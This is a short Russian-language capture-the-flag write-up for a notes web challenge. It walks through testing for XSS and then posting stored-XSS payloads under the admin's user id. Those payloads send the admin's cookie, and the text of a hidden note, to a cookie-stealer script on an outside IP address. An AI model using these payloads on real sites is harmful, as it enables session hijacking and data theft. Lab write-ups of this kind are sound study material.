1. Находим дополнительных флаг нажав кнопку append c незаполненным полем.

2. Проверям на xss передав <script>alert("TEST");</script> в notes. Видим, что проэксплуатировать его здесь получиться.

3. Видим, что http://notes.ctf2019.rocks/append принимает id юзера в параметрах. Из исходного кода страницы находим,
что у admin-а id=1.

4. Забираем куку админа передав в http://notes.ctf2019.rocks/append параметры 
append=<script>document.location='http://89.163.129.121:9999/cookiestealer.php?c='.concat(document.сokkie);</script>
&id=1   
и получаем доп флаг.

5. Смотрим js path к hidden записи админа.
Передаем  в http://notes.ctf2019.rocks/append параметры 
append=<script type="text/javascript">document.location='http://89.163.129.121:9999/cookiestealer.php?c='.concat(document.querySelector('body > div:nth-child(2) > div:nth-child(1) > p:nth-child(2)').innerText);</script>
&id=1 
и получаем влаг.

